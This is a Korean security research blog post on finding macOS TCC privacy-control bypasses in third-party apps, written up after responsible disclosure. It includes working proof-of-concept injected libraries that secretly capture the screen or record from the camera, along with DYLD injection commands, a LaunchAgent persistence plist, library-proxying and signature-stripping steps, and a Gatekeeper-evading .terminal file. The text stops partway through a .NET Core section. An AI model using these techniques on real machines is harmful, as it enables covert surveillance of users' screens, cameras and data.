---
layout: post
date: 2024-04-15
title: "Methodology for discovering TCC Bypass vulnerabilities in 3rd-party Applications"
tags: [OSX, TCC, ]
categories: [Research, bugbounty, ]
---


> 본 게시글은 **Responsible Vulnerability Disclosure** 모델을 따라 공개하였으며, 게시글에 언급된 모든 취약점들은 제보 조치 이후 90일이 지난 취약점임을 알려드립니다.<br>
> This post published by **Responsible Vulnerability Disclosure** model, and that all vulnerabilities mentioned in the post are vulnerabilities that have been reported for more than 90 days.
{: .prompt-info }


# Introduction


TCC(Transparency, Consent, and Control)란 개인 정보 보호를 목적으로 특정 기능에 대해 애플리케이션의 접근을 제한하고 제어하는 macOS의 보안 매커니즘이다.


전체 디스크 접근 권한, 카메라, 주소록 등과 같은 민감한 데이터에 대한 액세스를 요청할 때 TCC가 사용자에게 액세스를 허용할 지 묻는 다이얼로그가 표시된다.


![0](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/0.png)_TCC 다이얼로그_


TCC는 데이터베이스 파일로 관리되며, 총 두개의 데이터베이스 파일이 존재한다.


하나는 `/Library/Application Support/com.apple.TCC/TCC.db`에 위치한 데이터베이스로 전역적으로 TCC를 관리하기 위해 사용되며 다른 하나는 `/Users/<username>/Library/Application Support/com.apple.TCC`에 위치한 데이터베이스로 사용자별로 TCC를 관리하기 위해 사용된다.


<br>


위와 같은 데이터베이스 파일들은 Apple의 SIP(System Integrity Protection) 매커니즘으로 보호되며 root 권한을 가지더라도 SIP로 보호되는 파일을 수정할 수 없다.


다만 TCC의 접근 권한 중 `Full Disk Access` 권한을 통해 수정할 수 있다.


<br>


TCC는 애플리케이션이 가지고 있는 코드 서명을 기반으로 검사된다.


즉, 코드 서명별로 가지고 있는 권한이 다르고 서명이 다른 애플리케이션은 어떠한 애플리케이션의 권한에 액세스할 수 없음을 뜻한다.


<br>


TCC 관련 취약점을 찾는 것은 다음과 같은 전제 조건이 필요하다.

- root 권한을 소유한 공격자라도 Mac 소유자 동의 없이는 마음대로 TCC 권한을 사용할 수 없다.
- 따라서 어떠한 방법으로던 공격자가 임의의 TCC 권한을 사용할 수 있는 경우에는 취약점이라고 판단한다.

<br>


본 글에서는 3rd-party 애플리케이션에서 논리적인 취약점을 이용하여 TCC 권한을 탈취 및 남용하는 방법을 연구한 내용에 대해 기술한다.


<br>


약 한 달 남짓한 기간 동안 발견한 총 취약점 및 상태는 다음과 같다.


| Application             | Reported At | Vendor     | Status                 | Based on       | Category                                     | Note                                                                               |
| ----------------------- | ----------- | ---------- | ---------------------- | -------------- | -------------------------------------------- | ---------------------------------------------------------------------------------- |
| Nextcloud.app           | Hackerone   | Nextcloud  | CVE 발급 대기              | QT based       | Non Hardend Runtime                          | [Commit](https://github.com/nextcloud/desktop/pull/6378)                           |
| JANDI.app               | KISA        | Toss Lab   | KVE 발급 (KVE-2024-0073) | Electron based | Gatekeeper Bypass                            | N/A                                                                                |
| OpenVPN Connect.app     | Vendor      | OpenVPN    | CVE 발급 (CVE-2023-7224) | Unknown        | Allow Env Variables                          | N/A                                                                                |
| 8x8 Work.app            | Hackerone   | 8x8        | 거절 - Informative       | Electron based | Disable Library Validation, Library Proxying | 해당 Entitlement가 없으면 구현하지 못하는 기능이 있음. 보고서에서는 root 권한을 탈취했다고 가정했으므로 이후에 위험은 감수하겠다고 함 |
| Epic Games Launcher.app | Hackerone   | Epic Games | 거절 - Duplicated        | Unknown        | Allow Env Variables                          | N/A                                                                                |
| Logi Options Plus.app   | Hackerone   | Logitech   | 거절 - Duplicated        | Unknown        | Allow Env Variables                          | N/A                                                                                |

undefined
# 분석 방법


본 연구에서 TCC 우회 취약점을 발견하기 위해 사용한 툴들은 다음과 같다.

- Decompiler
	- Hopper (유료)
	- Ghidra
- MachOView
- Task Explorer
- codesign (built-in)
- otool (built-in)
- install_name_tool (built-in)
- xattr (built-in)
- xcode

아래부터는 각 케이스별로 TCC가 어떻게 우회되는지를 설명하며, 3rd-party Framework들이 가지고 있는 공통점을 이용하여 TCC를 우회하는 방법에 대해 설명한다.


## Runtime Flags 확인


Runtime Flags는 런타임시에 Apple이 정의한 보호 기법에 대한 사용 여부를 나타낸다.


이 중 Hardend Runtime Flag는 코드 삽입, DYLIB Hijacking, 프로세스 메모리 공간 변조 등과 같은 유형의 공격을 탐지 및 방지해주며 런타임시에 애플리케이션의 무결성을 보호해준다.


<br>


Apple은 Hardened Runtime Flag가 존재하지 않으면 공증(Notarizing)을 해주지 않으며, 이는 App Store에 앱을 등록할 수 없음을 의미한다.


<br>


Runtime Flags는 Apple이 제공해주는 도구 중 하나인 codesign을 이용하여 확인할 수 있다.


![1](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/1.png)


위 그림에서 runtime이라고 적혀 있는 것이 Hardend Runtime이 적용되었다는 것을 의미한다.


<br>


따라서 여기서는 Runtime Flags가 아무것도 적용되어 있지 않은 애플리케이션을 대상으로 TCC 권한을 남용하는 예를 보여준다.


해당 예는 Magnet이라는 애플리케이션에서 발견되어 CVE-2023-34190으로 등록된 취약점이다.


<br>


codesign을 이용하여 Flags를 확인한 결과는 다음과 같다.


![2](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/2.png)


앞서 말한 런타임과 관련한 보호 플래그가 하나도 적용되어 있지 않다.


이는 런타임시에 모든 조작이 가능하다 것을 의미하므로 환경 변수를 통한 라이브러리 주입을 통해 TCC 권한을 남용할 수 있다.


### 환경 변수를 통한 라이브러리 주입


Linux기반 운영체제에서 `LD_PRELOAD` 환경 변수를 통해 라이브러리를 주입할 수 있는 것 처럼, MacOS 또한 `DYLIB_INSERT_LIBRARIES` 환경 변수를 통해 라이브러리를 주입시킬 수 있다.


<br>


주입된 라이브러리는 주입한 애플리케이션 컨텍스트 내에서 실행되므로 애플리케이션이 가진 TCC 권한을 상속 받게 된다. 


TCC 매커니즘을 우회해야 하는 공격자 입장에서는 취약한 애플리케이션이 좋은 어택 벡터가 될 수 있다.


<br>



아래는 환경 변수를 통해 악성 라이브러리를 취약한 애플리케이션 컨텍스트에서 실행하여 손쉬운 사용 TCC 권한을 남용하는 예시를 설명한다.

1. 악성 라이브러리 작성

손쉬운 사용 권한을 탈취하여 사용자의 현재 화면을 캡처한 후 `/tmp/screenshot.png`에 저장하는 코드이다.


{% raw %}
```objective-c
#include <Foundation/Foundation.h>
#include <AppKit/AppKit.h>

__attribute__((constructor)) static void pwn() {
	[NSThread sleepForTimeInterval:3.000];

	CGImageRef screenshot = CGWindowListCreateImage(CGRectInfinite, kCGWindowListOptionOnScreenOnly, kCGNullWindowID, kCGWindowImageDefault);
	NSBitmapImageRep *bitmap = [[NSBitmapImageRep alloc] initWithCGImage:screenshot];
	NSData *data = [bitmap representationUsingType:NSBitmapImageFileTypePNG properties:NULL];
	[data writeToFile: @"/tmp/screenshot.png" atomically: NO];
}
```
{% endraw %}

1. 라이브러리 컴파일

{% raw %}
```bash
gcc -dynamiclib -framework Foundation -framework AppKit poc.m -o poc
```
{% endraw %}

1. 악성 라이브러리 주입

{% raw %}
```bash
$ DYLD_INSERT_LIBRARIES=/tmp/poc.dylib /Applications/Magnet.app/Contents/MacOS/Magnet
```
{% endraw %}

1. 결과

	![3](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/3.png)


Magnet 애플리케이션의 손쉬운 사용 권한을 탈취하여 피해자의 MacOS에서 스크린 캡처를 성공적으로 진행하였다.


## Entitlements 확인


MacOS에서 Entitlement란 MacOS의 서비스 또는 기술을 사용하기 위해 실행 권한을 부여하는 Key-Value 쌍이다.


예를 들어 애플리케이션이 사용자의 홈 자동화 네트워크에 접근하기 위해서는 명시적인 사용자 동의와 함께 HomeKit Entitlement가 필요하다.


Entitlement는 Runtime Flags와 마찬가지로 codesign 툴을 이용해 확인할 수 있다.


![4](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/4.png)


### Allow DYLD env variables


Hardened Runtime을 사용하더라도 환경변수 주입을 허용하는 entitlement를 사용할 경우에는 TCC 권한이 남용될 수 있다.


다음과 같은 두개의 entitlement가 적용되어 있는 애플리케이션은 항상 해당 애플리케이션의 TCC 권한을 남용할 수 있다.

- `com.apple.security.cs.allow-dyld-environment-variables`
- `com.apple.security.cs.disable-library-validation`

위의 두 entitlement를 포함한다면 사실상 Hardened Runtime이 적용되지 않은 애플리케이션과 동일하다.


<br>



아래부터는 위의 두 entitlement가 적용된 애플리케이션인 Logi Options Plus.app을 예로 들어 Exploit까지 연계하는 방법을 설명한다.


먼저 entitlements는 다음과 같다.


![5](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/5.png)


위에서 설명한 두 entitlement가 적용되어 있으므로 `Runtime Flags 확인 - 환경 변수를 통한 라이브러리 주입` 절에서 설명한 방법과 동일하게 진행할 수 있다.

1. 악성 라이브러리 작성

간단한 예시로 문자열 출력 후에 임의의 자식프로세스를 생성하는 DYLIB를 작성하였다.


{% raw %}
```objective-c
#include <Foundation/Foundation.h>

__attribute__((constructor)) static void pwn() {

   puts("\n\n[***] Proof of concept\n\n");

   NSTask *task = [[NSTask alloc] init];
   task.launchPath = @"/Applications/TaskExplorer.app/Contents/MacOS/TaskExplorer";
   [task launch];

}
```
{% endraw %}

1. 라이브러리 컴파일

{% raw %}
```bash
$ gcc -dynamiclib -framework Foundation poc.m -o poc.dylib
```
{% endraw %}

1. 악성 라이브러리 주입

{% raw %}
```bash
$ DYLD_INSERT_LIBRARIES=/tmp/poc.dylib /Applications/logioptionsplus.app/Contents/MacOS/logioptionsplus
```
{% endraw %}

1. 결과

	![6](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/6.png)


Logi Options 애플리케이션의 자식 프로세스로 임의의 프로세스인 TaskExplorer가 생성되었다. 이는 임의의 프로세스가 Logi Options 애플리케이션 컨텍스트 내에서 실행되므로 해당 앱이 가진 모든 TCC 권한을 남용할 수 있다는 것을 뜻한다.


### Launch Agent 설정


환경 변수를 통해 라이브러리 주입할 경우 주의해야할 사항이 존재한다.


<br>



MacOS에서는 터미널을 통해 애플리케이션을 실행하면 실행되는 애플리케이션은 터미널의 샌드박스 프로필을 상속 받는다.


따라서 환경변수를 통해 라이브러리를 주입하고 TCC로 보호되는 권한에 접근하게 되면 해당 애플리케이션이 가진 TCC 권한을 상속 받는게 아닌, 실행된 터미널의 TCC 권한을 상속 받는다.


<br>


예시로 터미널에서 위에서 설명한 Magnet 애플리케이션을 PoC 라이브러리와 함께 실행하면 다음 그림과 같이 터미널이 권한을 요청하게 된다.


![7](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/7.png)


이를 우회하기 위해서는 터미널이 아닌 다른 방식으로 애플리케이션을 실행해야 한다.


<br>


MacOS에서는 백그라운드에서 실행할 애플리케이션을 예약 및 등록할 수 있는 LaunchAgents 매커니즘을 제공한다.


이를 통해 샌드박스 프로필을 상속 받는게 아닌 실제 권한을 탈취할 프로세스의 프로필을 상속 받을 수 있다.


Launch Agent는 `~/Library/LaunchAgents`에 존재하는 파일들을 통해 관리되며, 정의된 규칙에 따른 XML 파일을 통해 백그라운드 실행을 등록할 수 있다.


<br>


다음은 Launch Agent를 이용한 샌드박스 우회 방법에 대해 설명한다.

1. `~/Library/LauncheAgents`에 Launch Agent 작성

{% raw %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.poc.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/poc.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Magnet.app/Contents/MacOS/Magnet</string>
        </array>
</dict>
</plist>
```
{% endraw %}


![8](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/8.png)

1. Launch Agent 등록 및 실행

{% raw %}
```bash
$ launchctl load com.poc.launcher.plist
```
{% endraw %}

1. 결과

터미널이 아닌 Magnet의 TCC 권한을 상속 받아 스크린 캡처를 진행한 것을 확인할 수 있다.


	![9](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/9.png)


	![10](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/10.png)


### Library Proxying


Library Proxying은 Library Hijacking이라고도 불리며 환경 변수를 통해 라이브러리를 주입할 수 없을 때 사용할 수 있다.


여기서 설명할 기법을 사용하기 위해서는 항상 다음 두 조건이 만족해야 한다.

- `com.apple.security.cs.disable-library-validation` entitlement 존재
- 특수 경로 기반 탐색을 통한 라이브러리 로드

<br>


다음은 Library Proxying 기법을 사용하는 방법에 대해 설명한다.


먼저, 여타 운영체제와 마찬가지로 런타임시에 링킹된 라이브러리를 탐색하는 방법은 다음과 같은 세가지 경우를 지정할 수 있다.

- 절대 경로 기반 탐색
- 상대 경로 기반 탐색
- 특수 경로 기반 탐색

<br>


현재 우리가 관심 있는 탐색 방법은 특수 경로 기반 탐색이다.


macOS에서 특수 경로는 `@`로 시작되는 환경변수를 의미하며 `@rpath`, `@executable_path`, `@loader_path` 등 여러가지 실행 환경변수를 통해 라이브러리를 로드한다.


<br>


각 환경 변수에 대한 설명은 다음과 같다.

- `@rpath` : LC_RPATH를 통해 지정된 디렉터리
- `@executable_path` : 애플리케이션의 실행파일이 위치한 디렉터리
- `@loader_path` : 라이브러리 또는 실행파일이 위치한 디렉터리

<br>


위와 같은 특수 경로를 통해 라이브러리 로드 경로를 명시해주면 실행 파일에는 LC_LOAD_DYLIB 명령을 통해 어떻게 라이브러리가 로드될 지 결정된다.


![11](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/11.png)


![12](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/12.png)


<br>


앞서 말했듯 TCC 보안 매커니즘은 최후의 방어선 매커니즘으로 사용되므로 우리는 root 권한을 획득하여 SIP로 보호되는 디렉터리가 아닌 모든 디렉터리를 읽거나 쓸 수 있다고 가정한다.


특수 경로 기반으로 라이브러리를 탐색할 때 특수 경로가 SIP로 보호되는 디렉터리가 아닌 이상 우리가 원하는 라이브러리를 로드시킬 수 있다.


<br>


아래부터는 Library Proxying 공격에 취약한 애플리케이션인 8x8 Work.app을 예로 들어 Exploit까지 연계하는 방법을 설명한다.


여기서 우리는 root 권한을 획득하였다고 가정한다.


<br>


먼저 Entitlements는 다음과 같다.


![13](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/13.png)


Hardened Runtime이 적용되어 있으나 Library validation이 비활성화되어 있다.


<br>


애플리케이션의 라이브러리 링킹 관련 정의는 `otool` 명령어 또는 `MachOView` 도구를 통해 확인할 수 있다.


여기서는 `otool` 명령어를 이용한 방법을 설명한다.


{% raw %}
```bash
$ otool -l 8x8\ Work
8x8 Work:
...
Load command 8
          cmd LC_RPATH
      cmdsize 48
         path @executable_path/../Frameworks (offset 12)
Load command 9
          cmd LC_LOAD_DYLINKER
      cmdsize 32
         name /usr/lib/dyld (offset 12)
...
Load command 13
          cmd LC_LOAD_DYLIB
      cmdsize 80
         name @rpath/Electron Framework.framework/Electron Framework (offset 24)
   time stamp 0 Thu Jan  1 09:00:00 1970
      current version 0.0.0
compatibility version 0.0.0
Load command 14
          cmd LC_LOAD_DYLIB
      cmdsize 56
         name /usr/lib/libSystem.B.dylib (offset 24)
   time stamp 0 Thu Jan  1 09:00:00 1970
      current version 1319.100.3
compatibility version 1.0.0
```
{% endraw %}


rpath가 `@executable_path/../Frameworks`로 정의되어 있으며 `Electron Framework.framework` 라이브러리를 rpath를 기반으로 찾는다.


최종적으로 다음과 같은 경로의 라이브러리를 로드하게 된다.

- `@executable_path/../Frameworks/Electron Framework.framework/Electron Framework`

{% raw %}
```bash
$ tree
├── CodeResources
├── Frameworks
│   ├── 8x8 Work Helper (GPU).app
│   │   ...
│   ├── 8x8 Work Helper (Plugin).app
│   │   ...
│   ├── 8x8 Work Helper (Renderer).app
│   │   ...
│   ├── 8x8 Work Helper.app
│   │   ...
│   ├── Electron Framework.framework
│   │   ├── Electron Framework -> Versions/Current/Electron Framework
│   │   ├── Helpers -> Versions/Current/Helpers
│   │   ├── Libraries -> Versions/Current/Libraries
│   │   ├── Resources -> Versions/Current/Resources
│   │   └── Versions
│   │       ├── A
│   │       │   ├── Electron Framework
│   │       │   ├── Helpers
│   │       │   │   └── chrome_crashpad_handler
│   │       │   ├── Libraries
│   │       │   │   ├── libEGL.dylib
│   │       │   │   ...
├── Info.plist
├── MacOS
│   └── 8x8 Work
...
```
{% endraw %}


`@excutable_path`는 `MacOS/8x8 Work`이므로 `Frameworks/Electron Framework.framework`를 변조하면 된다는 것을 파악할 수 있다.


<br>


다만 여기서 주의해야 할 점이 있다.


라이브러리를 임의의 라이브러리로 변경할 경우 애플리케이션에서 참조하던 라이브러리의 기호들이 사라지므로 애플리케이션이 정상적으로 작동하지 않는다.


따라서 기존 기호들을 찾을 수 있도록 임의의 라이브러리가 원본 라이브러리를 참조하도록 하는 Re-Export 기능을 사용해야 한다.


<br>


다음 순서는 악성 라이브러리를 Re-Export 하여 애플리케이션에 악성 라이브러리를 주입하고 정상 실행되도록 하는 방법이다.

1. 악성 라이브러리 작성

취약한 애플리케이션이 가지고 있는 카메라와 마이크 기능을 남용하기 위해 3초간 녹화하고 `/tmp/recording.mov`에 저장하는 코드를 작성하였다.


{% raw %}
```objective-c
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation VideoRecorder

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}

- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];

    if (error) {
        NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }

    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}

- (void)startRecording {
    [self.captureSession startRunning];
    // NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.mov"];
    NSString *outputFilePath = [@"/tmp/recording.mov" stringByExpandingTildeInPath];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}

- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@"Recording failed: %@", [error localizedDescription]);
    } else {
        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
    }
}

@end

__attribute__((constructor))
static void ex(int argc, const char **argv) {
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];

    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
```
{% endraw %}

1. 라이브러리 컴파일

위에서 설명했듯이 애플리케이션이 기존 기호를 정상적으로 참조할 수 있도록 Re-Export를 진행해주어야 한다.


xcode에서 다음과 같은 컴파일 플래그를 추가해준다.

- `-xlinker`
- `-reexport_library /Applications/8x8 Work.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework`
1. 라이브러리 변조

위 과정을 수행한 이후에 컴파일된 악성 라이브러리의 파일 헤더를 살펴보면 기본적으로 다음과 같이 특수 경로 기반으로 Re-Export 라이브러리를 찾는다.


![14](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/14.png)


따라서 우리는 악성 라이브러리가 원본 라이브러리를 참조하도록 변경해주어야 한다.


이는 Apple의 built-in 도구인 `install_name_tool`을 통해 변경해줄 수 있다.


원본 라이브러리는 로드되지 않도록 이름을 변경해준 후에 `install_name_tool`을 통해 악성 라이브러리가 원본 라이브러리를 참조하도록 변경한다.


{% raw %}
```bash
$ mv /Applications/8x8 Work.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Electron\ Framework /Applications/8x8 Work.app/Contents/Frameworks/Electron Framework.framework/Versions/A/_Electron\ Framework

$ install_name_tool -change "@rpath/poc.framework/Versions/A/poc" /Applications/8x8\ Work.app/Contents/Frameworks/Electron\ Framework.framework/Versions/A/_Electron\ Framework ./poc
```
{% endraw %}


![15](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/15.png)


<br>


이후에 애플리케이션이 악성 라이브러리를 로드하도록 원본 라이브러리가 위치했던 경로로 변경해준다.


{% raw %}
```markdown
$ mv /Users/lourcode/Library/Developer/Xcode/DerivedData/poc-eoopekezczbnvlgrpcigqhnhqgkn/Build/Products/Debug/poc.framework/Versions/A/poc /Applications/8x8\ Work.app/Contents/Frameworks/Electron\ Framework.framework/Versions/A/Electron\ Framework
```
{% endraw %}


최종적으로 디렉토리 구조는 다음과 같이 되어야 한다.


{% raw %}
```bash
$ tree
├── Electron Framework -> Versions/Current/Electron Framework
├── Helpers -> Versions/Current/Helpers
├── Libraries -> Versions/Current/Libraries
├── Resources -> Versions/Current/Resources
└── Versions
    ├── A
    │   ├── Electron Framework # 변조된 악성 라이브러리
    │   ├── Helpers
    │   │   └── chrome_crashpad_handler
    │   ├── Libraries
						...
    │   ├── Resources
    │   │   ...
    │   ├── _CodeSignature
    │   └── _Electron Framework # 원본 라이브러리
    └── Current -> A
```
{% endraw %}

1. 추가 작업

악성 라이브러리에 대한 Libary Validation 관련 작업을 수행하지 않았으므로 현재 상태에서 애플리케이션을 실행하게 되면 라이브러리 로드가 실패하게 된다.


따라서 악성 라이브러리 및 원본 라이브러리의 코드 서명을 삭제해주어야 한다.


이는 라이브러리에 대한 서명을 제거하는 것이므로 애플리케이션의 TCC 권한에는 영향을 주지 않는다.


만약 Library Validation이 활성화 되어 있었을 경우에는 코드 서명을 제거한 라이브러리는 로드되지 않았을 것이다.


{% raw %}
```bash
$ codesign --remove-signature ./Electron\ Framework
$ codesign --remove-signature ./_Electron\ Framework
```
{% endraw %}

1. 결과

이제 애플리케이션을 실행하면 악성 라이브러리가 로드되어 카메라 권한을 남용하고 `/tmp/recording.mov` 위치에 영상을 저장하게 된다.


![16](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/16.png)


## 파일 다운로드 기능을 가지는 경우


애플리케이션 자체에 파일 다운로드 기능을 가지는 경우 macOS의 또 다른 보안 매커니즘 중 하나인 Gatekeeper를 우회할 수 있는 경우가 존재한다.


Gatekeeper란 사용자가 신뢰하는 소프트웨어만이 실행될 수 있도록 보장하는 것으로 신뢰하지 않는 애플리케이션의 경우 다음과 같은 경고창이 표시된다.


![17](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/17.png)


애플리케이션에서 다운로드되는 실행 파일은 `com.apple.quarantine` 속성이 존재해야 한다.


여기서 `com.apple.quarantine` 속성은 격리 여부를 나타내는 속성으로 해당 속성을 통해 다운로드된 파일을 격리할 수 있다.


이 속성이 활성화되면 Gatekeeper는 다운로드된 파일을 검사하며 사용자에게 허용할 것은 묻는 다이얼로그를 표시한 후 허용 여부에 따라 파일을 처리한다.


또한 Info.plist의 `LSFileQuarantineEnabled` 속성을 통해 OS에게 격리 과정을 위임하는 것 또한 가능하다.


<br>


`.terminal` 파일은 아직 널리 알려지지 않은 파일 중 하나로 실행 이미지가 아닌 구성 프로필이다. 따라서 Excuatable 권한이 필요하지 않다.


보통 터미널에서 보이는 상태로 실행되며, 보이지 않는 상태로도 실행 가능하다.


또한 이 확장자는 서명될 수 없으나 Quarantine을 통과한 경우 서명은 문제가 되지 않는다.


<br>


아래는 `.terminal` 파일의 예시이다.


{% raw %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>echo "Hello" &amp;&amp; id;</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
```
{% endraw %}


<br>


아래의 취약점은 업무 협업 도구인 JANDI에서 발견한 취약점으로 실행 구성 파일인 `.terminal` 파일을 격리하지 않아 Gatekeeper가 우회된다.


<br>


안전한 애플리케이션에서 다운로드한 실행 파일의 경우 다음과 같이 격리되어 Gatekeeper가 동작된다.


![18](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/18.png)


 


Apple의 `xattr` 툴을 통해 `Quarantine`의 여부를 확인할 수 있다.


![19](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/19.png)


안전한 애플리케이션에서 다운로드한 파일은 위에서 설명한 `com.apple.quarantine` 속성이 존재하므로 해당 파일은 격리되며 Gatekeeper가 이 파일을 검사한다.


<br>


그러나 안전하지 않은 애플리케이션인 JANDI에서 다운로드한 실행 파일의 경우 다음과 같이 격리되지 않고 임의의 명령이 실행된다.


![20](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/20.png)


![21](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/21.png)


`xattr` 툴을 통해 확인해보면 `com.apple.quarantine` 속성이 존재하지 않는다는 것을 알 수 있다.


따라서 이 파일은 Gatekeeper의 경고 없이 실행될 수 있다.


![22](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/22.png)


<br>


위 사례에서 보여준 것처럼 `.terminal` 파일은 잘 알려지지 않았기 때문에 파일 다운로드에 대한 필터링이 걸려있지 않은 경우가 많다.


또한 동일한 취약점이 Slack, WhatsApp 등 메이저 벤더에서도 발생했었으므로 파일 다운로드 기능을 갖는 애플리케이션에서 한번쯤 확인해보면 좋다.


## .NET Core 기반 애플리케이션의 경우


위에서 설명한 기법들은 Library Validation이 활성화되어 있을 경우 사용할 수 없다.


따라서 이 절에서는 Library Validation이 활성화된 .NET Core 기반 애플리케이션에서 라이브러리 주입이 아닌 애플리케이션에 할당된 메모리를 직접 조작함으로써 TCC 권한을 탈취하는 방법에 대해 설명한다.


<br>


일반적인 애플리케이션의 경우 메모리 조작 또한 Apple의 Hardened Runtime이 활성화되어 있을 경우 차단된다.


그러나 .NET Core 기반 애플리케이션에서는 이를 허용하는 특수한 기능이 존재한다.


<br>


아래 그림은 높은 권한의 Entitlement를 가진 lldb와 root 권한을 소유한 채로 프로세스 디버깅을 시도하는 것을 보여준다.


![23](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/23.png)


앞서 말했듯이 Hardened Runtime에 의해 차단된다.


<br>


.NET Core의 소스코드에서 `dbgtransportsession.cpp` 파일은 .NET Core 기반 애플리케이션을 디버깅하기 위해 구현된 코드가 존재한다.


이는 Hardened Runtime에 영향을 받지 않으므로 .NET Core로 개발된 애플리케이션의 메모리 조작이 가능할 수도 있음을 뜻한다.


<br>


.NET Core는 `DbgTransportSession::Init` 메서드를 통해 디버그 세션을 생성하고 `TwoWayPipe::CreateServer` 메서드를 호출하여 두개의 디버그 파이프를 생성한다.


{% raw %}
```c++
// https://github.com/dotnet/runtime/blob/35562ee5ac02c68d42d5b77fb0af09123d79c3ba/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L16
bool TwoWayPipe::CreateServer(const ProcessDescriptor& pd)
{
    _ASSERTE(m_state == NotInitialized);
    if (m_state != NotInitialized)
        return false;

    PAL_GetTransportPipeName(m_inPipeName, pd.m_Pid, pd.m_ApplicationGroupId, "in");
